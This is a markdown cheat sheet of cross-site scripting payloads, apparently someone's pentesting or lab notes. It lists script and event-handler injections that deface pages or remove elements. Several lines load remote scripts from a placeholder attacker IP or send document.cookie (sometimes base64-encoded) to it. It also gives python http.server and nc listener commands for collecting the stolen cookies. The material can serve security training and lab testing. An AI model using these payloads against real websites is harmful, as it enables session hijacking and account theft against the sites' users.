# XSS Payloads

Vulnerable parametrs can be all that we can modify in BurpSuite from User-Agent to specific parametrs as username,password

```html
<script>alert(window.origin)</script> 	Basic XSS Payload

<plaintext> 	Basic XSS Payload

<script>print()</script> 	Basic XSS Payload

<img src="" onerror=alert(window.origin)> 	HTML-based XSS Payload

<script>document.body.style.background = "#141d2b"</script> 	Change Background Color

<script>document.body.background = "https://example.com/images/logo-htb.svg"</script> 	Change Background Image

<script>document.title = 'EXAMPLE XSS'</script> 	Change Website Title

<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script> 	Overwrite website's main body

<script>document.getElementById('urlform').remove();</script> 	Remove certain HTML element

<script src="http://YOUR_IP/script.js"></script> 	Load remote script

<script>new Image().src='http://YOUR_IP/index.php?c='+document.cookie</script> 	Send Cookie details to us


<script src="http://your_ip/xss.js"> // where xss.js file have payload that is below 
document.write('<img src="http://your_ip/?'+document.cookie+'">'); //into file
python3 -m http.server 80 // on your machine or 
nc -lvnp 80


HTML payload
"><u>test123 // for testing output test123
test123"><img src=x onerror=alert(10)>
<u/onmouseover=alert(1)>test123

<script>var i=new Image(); i.src="http://my_ip:5000/?cookie="+btoa(document.cookie);</script> // we can steal cookie when website is runned in same port as ->
python3 -m http.server 5000 // so we take cookie in base64
```































